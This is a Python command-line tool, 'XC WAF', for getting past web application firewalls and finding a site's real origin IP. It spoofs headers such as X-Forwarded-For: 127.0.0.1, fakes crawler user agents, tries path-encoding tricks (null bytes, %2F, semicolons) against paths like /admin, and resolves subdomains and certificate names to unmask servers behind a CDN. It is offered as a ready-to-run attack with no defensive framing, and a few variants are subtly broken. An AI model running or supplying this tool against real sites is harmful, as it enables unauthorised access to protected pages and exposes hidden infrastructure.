#!/usr/bin/env python3
"""XC WAF — WAF Bypass & Real IP Hunter"""

import sys, ssl, socket, time, argparse
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[97m'; DIM='\033[2m'; BOLD='\033[1m'; RST='\033[0m'

BANNER = f"""{Y}
╦ ╦╔═╗╔═╗  ╔╗ ╦ ╦╔═╗╔═╗╔═╗
║║║╠═╣╠╣   ╠╩╗╚╦╝╠═╝╠═╣╚═╗╚═╗
╚╩╝╩ ╩╚    ╚═╝ ╩ ╩  ╩ ╩╚═╝╚═╝{RST}
{DIM}WAF Bypass & Real IP Hunter — XC Hub{RST}
"""

BASE_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

BYPASS_PAYLOADS = [
    {'name': 'Localhost spoof',       'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1', 'X-Originating-IP': '127.0.0.1', 'X-Remote-IP': '127.0.0.1'}},
    {'name': 'Internal IP spoof',     'headers': {'X-Forwarded-For': '192.168.1.1', 'CF-Connecting-IP': '192.168.1.1'}},
    {'name': 'Cloudflare bypass',     'headers': {'CF-Connecting-IP': '1.1.1.1', 'X-Forwarded-For': '1.1.1.1'}},
    {'name': 'Admin spoof',           'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Custom-IP-Authorization': '127.0.0.1'}},
    {'name': 'Double X-Forwarded',    'headers': {'X-Forwarded-For': '127.0.0.1, 127.0.0.2'}},
    {'name': 'X-Host override',       'headers': {'X-Host': '127.0.0.1', 'X-Forwarded-Host': '127.0.0.1'}},
    {'name': 'Origin spoof',          'headers': {'Origin': 'http://localhost', 'Referer': 'http://localhost/'}},
    {'name': 'Mobile UA',             'headers': {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'}},
    {'name': 'Googlebot UA',          'headers': {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}},
    {'name': 'Bingbot UA',            'headers': {'User-Agent': 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'}},
    {'name': 'Case variation path',   'headers': {}, 'path_mod': lambda p: p.upper()},
    {'name': 'Double slash path',     'headers': {}, 'path_mod': lambda p: '/' + p.lstrip('/')},
    {'name': 'Null byte path',        'headers': {}, 'path_mod': lambda p: p + '%00'},
    {'name': 'Accept override',       'headers': {'Accept': 'application/json', 'Content-Type': 'application/json'}},
    {'name': 'Cache bypass',          'headers': {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}},
]

REAL_IP_SERVICES = [
    'https://api.ipify.org',
    'https://ifconfig.me/ip',
    'https://icanhazip.com',
]

SUBDOMAINS_TO_TRY = [
    'direct', 'origin', 'mail', 'ftp', 'cpanel', 'whm', 'webmail',
    'admin', 'backend', 'api', 'dev', 'staging', 'old', 'new',
    'app', 'server', 'smtp', 'pop', 'imap', 'vpn', 'ns1', 'ns2',
]

def fetch(url, headers=None, timeout=8):
    h = {'User-Agent': BASE_UA, 'Accept': '*/*', **(headers or {})}
    req = Request(url, headers=h)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(2048).decode('utf-8', errors='ignore')
            return r.status, dict(r.headers), body
    except HTTPError as e:
        try: body = e.read(512).decode('utf-8', errors='ignore')
        except: body = ''
        return e.code, dict(e.headers), body
    except Exception as e:
        return None, {}, str(e)

def baseline(url):
    print(f"\n{BOLD}{B}━━━ BASELINE REQUEST ━━━{RST}")
    status, hdrs, body = fetch(url)
    color = G if status and 200 <= status < 300 else R
    print(f"  {color}Status: {status}{RST}")
    for k in ['server','x-powered-by','cf-ray','x-cache','via']:
        if k in {x.lower() for x in hdrs}:
            v = next(v for x,v in hdrs.items() if x.lower()==k)
            print(f"  {C}{k}{RST}: {v}")
    return status

def try_bypasses(url):
    print(f"\n{BOLD}{B}━━━ WAF BYPASS ATTEMPTS ━━━{RST}")
    parsed = urlparse(url)
    base_path = parsed.path or '/'
    wins = []
    for bp in BYPASS_PAYLOADS:
        path = bp.get('path_mod', lambda x: x)(base_path)
        test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
        if parsed.query:
            test_url += '?' + parsed.query
        status, hdrs, body = fetch(test_url, headers=bp['headers'])
        color = G if status and 200 <= status < 300 else Y if status in (301,302) else DIM
        sym = '✓' if status and 200 <= status < 300 else '○'
        print(f"  {color}{sym} [{status}]{RST} {bp['name']}")
        if status and 200 <= status < 300:
            wins.append(bp['name'])
        time.sleep(0.1)
    if wins:
        print(f"\n{G}Bypasses that returned 2xx:{RST} {', '.join(wins)}")
    return wins

def subdomain_ip_hunt(host):
    print(f"\n{BOLD}{B}━━━ REAL IP via SUBDOMAINS ━━━{RST}")
    domain = '.'.join(host.split('.')[-2:])
    found_ips = {}
    for sub in SUBDOMAINS_TO_TRY:
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            if ip not in found_ips:
                found_ips[ip] = []
            found_ips[ip].append(fqdn)
            print(f"  {G}+{RST} {fqdn} → {W}{ip}{RST}")
        except:
            pass
        time.sleep(0.05)
    main_ip = socket.gethostbyname(host) if True else None
    try: main_ip = socket.gethostbyname(host)
    except: main_ip = None
    if found_ips:
        print(f"\n{C}Unique IPs found:{RST}")
        for ip, subs in found_ips.items():
            note = ' ← DIFFERENT (possible origin!)' if ip != main_ip else ''
            print(f"  {W}{ip}{RST}{Y}{note}{RST} — via {', '.join(subs[:3])}")
    else:
        print(f"  {DIM}No subdomains resolved{RST}")
    return found_ips

def cert_san_hunt(host):
    print(f"\n{BOLD}{B}━━━ CERT SAN → REAL IP ━━━{RST}")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(5)
            s.connect((host, 443))
            cert = s.getpeercert()
            sans = [v for t,v in cert.get('subjectAltName', []) if t == 'DNS']
            if sans:
                print(f"  SANs: {', '.join(sans[:10])}")
                for san in sans:
                    try:
                        ip = socket.gethostbyname(san)
                        print(f"  {C}{san}{RST} → {W}{ip}{RST}")
                    except: pass
            else:
                print(f"  {DIM}No SANs in cert{RST}")
    except Exception as e:
        print(f"  {R}SSL failed: {e}{RST}")

def path_case_bypass(url):
    print(f"\n{BOLD}{B}━━━ PATH ENCODING BYPASS ━━━{RST}")
    variants = [
        ('URL-encoded slash',    url.replace('/', '%2F')),
        ('Double slash',         url.replace('://', '://').replace('/admin', '//admin')),
        ('Uppercase path',       url.upper().replace('HTTPS://', 'https://').replace('HTTP://', 'http://')),
        ('Null byte',            url + '%00'),
        ('Dot segment',          url.replace('/admin', '/./admin')),
        ('Extra dot',            url.replace('/admin', '/admin.')),
        ('Semicolon',            url.replace('/admin', '/admin;/')),
    ]
    for name, v_url in variants:
        status, hdrs, body = fetch(v_url)
        color = G if status and 200 <= status < 300 else DIM
        print(f"  {color}[{status}]{RST} {name}")
        time.sleep(0.1)

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XC WAF Bypass Tool')
    parser.add_argument('target', help='Target URL (e.g. https://example.com/admin)')
    parser.add_argument('--subs', action='store_true', help='Hunt real IP via subdomains')
    parser.add_argument('--cert', action='store_true', help='Cert SAN IP hunt')
    parser.add_argument('--paths', action='store_true', help='Path encoding bypasses')
    parser.add_argument('--full', action='store_true', help='All bypass techniques')
    args = parser.parse_args()

    target = args.target
    if not target.startswith('http'):
        target = 'https://' + target
    parsed = urlparse(target)
    host = parsed.hostname

    print(f"{BOLD}Target:{RST} {W}{target}{RST}")
    print(f"{BOLD}Host:{RST}   {W}{host}{RST}")

    base_status = baseline(target)
    try_bypasses(target)
    if args.subs or args.full:
        subdomain_ip_hunt(host)
    if args.cert or args.full:
        cert_san_hunt(host)
    if args.paths or args.full:
        path_case_bypass(target)

    print(f"\n{DIM}Done. Use --full for all techniques, --subs for subdomain IP hunt.{RST}\n")

if __name__ == '__main__':
    main()
